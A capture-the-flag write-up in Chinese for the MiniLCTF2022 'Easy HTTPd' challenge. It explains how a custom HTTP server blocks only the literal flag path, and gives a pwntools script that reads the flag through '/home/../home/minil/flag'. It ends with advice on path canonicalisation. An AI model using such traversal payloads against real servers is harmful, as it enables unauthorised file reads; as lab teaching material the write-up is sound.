# MiniLCTF2022 Easy HTTPd Writeup

## 题目简述

附件是自实现的 HTTP 服务二进制。它从请求中提取 `GET` 后的路径，要求出现固定的 `User-Agent: MiniL`，随后把路径直接交给 `open()` 并回传文件内容。程序只用字符串比较禁止精确路径 `/home/minil/flag`，没有先做路径规范化。

## 解题过程

逆向请求解析函数可知，服务在收到 `\r\n\r\n` 后停止读取；只要报文同时包含：

```text
GET <path>\r\n
User-Agent: MiniL\r\n\r\n
```

就会把 `<path>` 传入文件读取函数。过滤逻辑近似为：

```c
if (strcmp(path, "/home/minil/flag") != 0) {
    send_file(socket_fd, path);
}
```

Linux VFS 会在 `open()` 时解析 `.` 和 `..`，但 `strcmp` 只比较原始字符串。因此使用语义相同、字面不同的路径即可绕过：

```python
from pwn import remote

io = remote(host, port)
payload = (
    b"GET /home/../home/minil/flag\r\n"
    b"User-Agent: MiniL\r\n\r\n"
)
io.send(payload)
print(io.recvall())
```

`/home/./minil/flag` 也能达到同样效果。Docker 部署文件确认 flag 位于 `/home/minil/flag`；服务响应直接包含文件内容。

## 方法总结

这是原生二进制中的路径规范化漏洞，决定性原语仍是服务端文件读取，因此利用写法接近 Web 路径穿越，但需要先逆出私有报文格式。安全检查必须对 `realpath` 后的规范路径做目录边界验证，或只允许从预先打开的目录文件描述符下读取白名单文件；禁止一个字面路径无法阻止 `.`、`..`、重复斜杠等等价表示。
